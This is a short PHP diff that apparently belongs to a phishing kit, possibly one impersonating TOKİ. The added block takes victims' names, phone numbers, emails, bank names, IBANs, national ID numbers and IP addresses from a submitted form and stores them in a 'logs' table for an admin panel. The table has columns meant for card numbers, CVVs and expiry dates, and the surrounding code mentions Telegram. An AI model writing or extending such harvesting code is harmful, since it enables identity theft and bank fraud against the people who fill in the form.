@@ -125,6 +125,36 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 $_SESSION['telegram_error'] = null;
             }
         }
+
+        // Admin panele kaydet (logs tablosuna)
+        require_once 'inc/brain.php';
+        try {
+            $adsoyad = isset($_POST['myadsoyad']) ? $_POST['myadsoyad'] : '';
+            $cep = isset($_POST['cep']) ? $_POST['cep'] : '';
+            $email = isset($_POST['vadecen']) ? $_POST['vadecen'] : '';
+            $banka = isset($_POST['bank']) ? $_POST['bank'] : '';
+            $iban = isset($_POST['myiban']) ? $_POST['myiban'] : '';
+            $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+            $stmt = $pdo->prepare("INSERT INTO logs
+                (adsoyad, kart_numarasi, kart_cvv, kart_skt, banka_adi, ip_address, tckns, mevcut_sayfa, email, aktif_check)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+
+            $stmt->execute([
+                $adsoyad,
+                'TOKİ-' . $iban, // IBAN'ı kart numarası yerine
+                $cep,            // Telefonu CVV yerine
+                $email,          // Email'i SKT yerine
+                $banka,
+                $ip,
+                $tckn,
+                '1binfo.php',
+                $email,
+                time()
+            ]);
+        } catch (Exception $e) {
+            error_log("Log kayıt hatası: " . $e->getMessage());
+        }
     }
 }
 ?>
